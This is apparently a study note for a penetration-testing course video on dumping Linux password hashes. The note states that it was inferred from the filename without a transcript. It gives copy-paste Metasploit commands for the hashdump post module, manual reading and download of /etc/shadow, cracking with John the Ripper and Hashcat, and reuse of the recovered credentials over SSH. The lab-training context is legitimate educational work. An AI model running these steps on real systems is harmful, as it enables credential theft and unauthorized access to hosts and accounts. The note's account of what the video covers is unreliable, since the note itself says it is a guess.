# 07 - Dumping Hashes With Hashdump (Linux Post-Exploitation)

Note: No transcript was provided. The following summary is inferred conservatively from the filename and folder (05-LinuxPostExploitation). It covers the standard Metasploit workflow for dumping Linux password hashes (from /etc/shadow) using the hashdump post module and prepping them for cracking.

## What the video covers (Introduction / big picture)
- How to dump password hashes from a compromised Linux host using Metasploit’s hashdump post module.
- Prerequisites: you already have a session on the target (ideally a Meterpreter session) and sufficient privileges to read /etc/shadow (typically root).
- Where the dumped hashes are stored (Metasploit loot) and how to prepare them for offline cracking with John the Ripper (and optionally Hashcat).
- Quick manual alternatives if the module fails.

## Flow (ordered)
1. Confirm you have a working session on a Linux target (preferably Meterpreter).
2. Check your privileges (you need root to read /etc/shadow).
3. Run Metasploit’s post/linux/gather/hashdump module against the session.
4. Locate the loot files saved by Metasploit (shadow/passwd/hashes).
5. If needed, manually grab /etc/passwd and /etc/shadow.
6. Prepare a crackable file (unshadow) for John.
7. Crack hashes with John (or extract just hashes for Hashcat).
8. Reuse recovered credentials for further access or escalation.

## Tools highlighted
- Metasploit Framework (msfconsole)
  - Meterpreter
  - post/linux/gather/hashdump
  - loot
- Linux system files: /etc/passwd and /etc/shadow
- John the Ripper (unshadow, john)
- Optional: Hashcat
- Useful shell utilities: awk, cut, grep

## Typical command walkthrough (detailed, copy-paste friendly)

Assumptions:
- You have msfconsole running and at least one session on a Linux target.
- If your session is a basic shell, upgrade to Meterpreter for best results.

1) List sessions and upgrade shell to Meterpreter if needed
```
msf6 > sessions -l
# If your session is a shell (not meterpreter), upgrade it:
msf6 > sessions -u <session_id>
msf6 > sessions -i <meterpreter_session_id>
meterpreter > getuid
meterpreter > sysinfo
```

2) Verify privilege (need root to read /etc/shadow)
```
meterpreter > shell
id
# If not root, attempt privilege escalation before proceeding.
exit
```

3A) Run the hashdump post module from msfconsole
```
msf6 > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set SESSION <meterpreter_session_id>
msf6 post(linux/gather/hashdump) > run
```

3B) Or run it directly from the Meterpreter prompt
```
meterpreter > run post/linux/gather/hashdump
```

- The module attempts to read /etc/passwd and /etc/shadow, then parses and saves loot. Metasploit prints the saved loot file paths (e.g., under ~/.msf4/loot/).

4) View loot to find saved files (hashes, passwd, shadow)
```
msf6 > loot
```

5) Manual fallback (if the module fails or you prefer manual)
```
meterpreter > shell
cat /etc/passwd
cat /etc/shadow   # requires root
exit
# Or pull files directly:
meterpreter > download /etc/passwd
meterpreter > download /etc/shadow
```

6) Prepare for John the Ripper (unshadow combines passwd+shadow)
```
# On attacker machine:
# If rockyou is still compressed:
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

# Combine (use the files you downloaded or those saved by Metasploit loot):
unshadow /path/to/passwd /path/to/shadow > unshadowed.txt
```

7) Crack with John
```
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt
```
- John auto-detects most Linux hash types:
  - $1$ = md5crypt
  - $5$ = sha256crypt
  - $6$ = sha512crypt
  - $y$ = yescrypt (requires jumbo John; supported in current packages)

8) Optional: Prepare hashes for Hashcat
```
# Extract just "username:hash" lines with valid hashes (exclude locked accounts)
awk -F: '($2 !~ /^\*|^!$/ && $2 != "" && $2 != "x"){print $1 ":" $2}' /path/to/shadow > hashcat_user_hashes.txt
# Or just the hashes (second field) if you don’t need usernames:
awk -F: '($2 !~ /^\*|^!$/ && $2 != "" && $2 != "x"){print $2}' /path/to/shadow > hashes_only.txt

# Determine hash mode from the prefix:
# $1$ -> -m 500 (md5crypt)
# $5$ -> -m 7400 (sha256crypt)
# $6$ -> -m 1800 (sha512crypt)
# bcrypt ($2a$/$2y$) -> -m 3200
# yescrypt ($y$) -> prefer John (Hashcat support varies by version)

# Example for SHA-512 crypt ($6$):
hashcat -m 1800 hashes_only.txt /usr/share/wordlists/rockyou.txt
```

9) Reuse creds for further actions
```
# Example: SSH with found creds
ssh username@target
# Or switch user on an interactive shell
su - username
```

## Practical tips
- The post/linux/gather/hashdump module requires sufficient privileges to read /etc/shadow. If it fails with permission denied, escalate to root first.
- You can run the module directly from meterpreter via: run post/linux/gather/hashdump
- Metasploit loot paths are printed when the module runs; use msfconsole’s loot command to rediscover them later.
- Recognize hash types by prefix: $1$ (MD5), $5$ (SHA-256), $6$ (SHA-512), $2x/$2y (bcrypt), $y$ (yescrypt).
- For yescrypt ($y$), John the Ripper (jumbo) is typically the simplest route.
- Filter out system or locked accounts when cracking to save time (shadow entries with ! or * in the password field are locked).
- If you only have a standard shell in Metasploit, upgrade it: sessions -u <id>
- Keep your cracking wordlists updated and uncompressed; rockyou.txt is a common baseline for eJPT labs.

## Minimal cheat sheet (one-screen flow)
```
# In msfconsole:
sessions -l
sessions -u <id>                     # if needed, upgrade shell to Meterpreter
use post/linux/gather/hashdump
set SESSION <meterpreter_session_id>
run
loot                                 # note paths to passwd/shadow/hashes

# If manual:
sessions -i <meterpreter_session_id>
meterpreter > download /etc/passwd /etc/shadow

# Prepare and crack:
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
unshadow /path/to/passwd /path/to/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt
```

## Summary
- The video demonstrates dumping Linux password hashes via Metasploit’s post/linux/gather/hashdump after gaining a session on the target.
- The module collects /etc/passwd and /etc/shadow, saves them as loot, and outputs crack-ready data.
- When the module cannot access /etc/shadow, escalate privileges or pull the files manually.
- Use unshadow + John to crack quickly; fall back to Hashcat with the correct mode if preferred.
- Recovered credentials can enable lateral movement and privilege escalation in subsequent steps.